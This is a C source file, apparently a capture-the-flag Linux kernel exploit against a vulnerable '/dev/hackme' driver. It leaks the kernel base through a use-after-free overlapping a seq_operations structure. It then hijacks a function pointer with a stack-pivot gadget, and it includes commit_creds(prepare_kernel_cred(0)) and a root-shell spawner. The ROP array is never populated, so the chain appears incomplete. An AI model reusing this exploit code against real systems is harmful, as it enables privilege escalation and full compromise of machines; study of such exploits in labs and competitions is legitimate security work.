#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/sem.h>
#include <sys/mman.h>

int fd;
size_t heap_base, vmlinux_base, mod_tree, modprobe_path, ko_base, pool_addr;
size_t vmlinux_base, heap_base, off, commit_creds, prepare_kernel_cred;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t rop[0x100] = {0};
int fd_seq;

struct Heap{
    size_t index;
    char *data;
    size_t len;
    size_t offset;
};

void add(int index, size_t len, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	ioctl(fd, 0x30000, &heap);
}

void delete(int index)
{
	struct Heap heap;
	heap.index = index;
	ioctl(fd, 0x30001, &heap);
}

void edit(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30002, &heap);
}

void show(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30003, &heap);
}


void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
	puts("[+] save the state success!");
}

void get_shell()
{
	if (getuid() == 0)
	{
		puts("[+] get root");
		//system("/bin/sh");
		char *shell = "/bin/sh";
		char *args[] = {shell, NULL};
		execve(shell, args, NULL);
	}
	else
	{
		puts("[-] get shell error");
		sleep(3);
		exit(0);
	}
}

void get_root(void)
{
	//commit_creds(prepare_kernel_cred(0));
	void *(*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
	void (*cc)(void *) = (void (*)(void *))commit_creds;
	(*cc)((*pkc)(0));
}

int main()
{
	char buf[0x1000] = {0};
	int i;
	size_t seq_data[4] = {0};

	save_status();

	fd = open("/dev/hackme",0);
	if(fd < 0)
	{
		puts("[-] open file error");
		exit(0);
	}

	add(0, 0x20, buf); // 0
	add(1, 0x20, buf); // 1

	delete(0);

	fd_seq = open("/proc/self/stat", 0);
	if(fd_seq < 0)
	{
		puts("[-] open stat error");
		exit(0);
	}
	
	show(1, 0x20, -0x20, buf);
	vmlinux_base = ((size_t *)buf)[0] - 0xd30c0;
	printf("[+] vmlinux_base=> 0x%lx\n", vmlinux_base);
	off = vmlinux_base - raw_vmlinux_base;
	commit_creds = off + 0xffffffff8104d220;
	prepare_kernel_cred = off + 0xffffffff8104d3d0;

	size_t gadget = 0xffffffff8103018e; // xchg eax, esp; ret;
	((size_t *)buf)[0] = gadget;

	edit(1, 0x20, -0x20, buf);

	__asm__(
	"mov r15, 0x1111111111;"
	"mov r14, 0x2222222222;"
	"mov r13, 0x3333333333;"
	"mov r12, 0x4444444444;"
	"mov rbp, 0x5555555555;"
	"mov rbx, 0x6666666666;"
	"mov r11, 0x7777777777;"
	"mov r10, 0x8888888888;"
	"mov r9,  0x9999999999;"
	"mov r8,  0xaaaaaaaaaa;"
	"mov rcx, 0x666666;"
	"mov rdx, 8;"
	"mov rsi, rsp;"
	"mov rdi, fd_seq;"
	"xor rax, rax;"
	"syscall"
	);
	return 0;
}
